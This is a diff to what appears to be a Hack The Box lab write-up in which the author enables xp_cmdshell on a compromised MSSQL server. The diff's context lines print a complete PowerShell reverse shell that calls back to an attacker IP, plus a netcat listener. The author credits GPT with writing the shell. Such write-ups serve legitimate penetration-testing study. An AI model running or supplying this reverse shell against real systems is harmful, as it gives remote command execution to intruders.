@@ -308,7 +308,7 @@ SQL (sa  dbo@msdb)> RECONFIGURE;
 ```
 
 Interesting.
-So here, I selecte msdb and allow the current user to run `xp_cmdshell` commands so now I can run `powershell` commands from SQL client! Noice! Let's ping to our local client from here.
+So here, I selecte `msdb`  and allow the current user to run `xp_cmdshell` commands so now I can run `powershell` commands from SQL client! Noice! Let's ping to our local client from here.
 ```sql
 SQL (sa  dbo@msdb)> exec xp_cmdshell 'ping 10.10.16.79 -n 10';
 ^Moutput                                                       
@@ -345,7 +345,7 @@ Attempting to get a reverse `powershell`
 xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.16.79'',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
 ```
 
-I simply ask GPT to write me the above command and voila!
+I simply ask GPT to write me the above command and voila! Below is what I get on my local machine.
 ```bash
 ──(truelyyours㉿kali)-[~/linkvortex_htb]
 └─$ nc -nvlp 8080
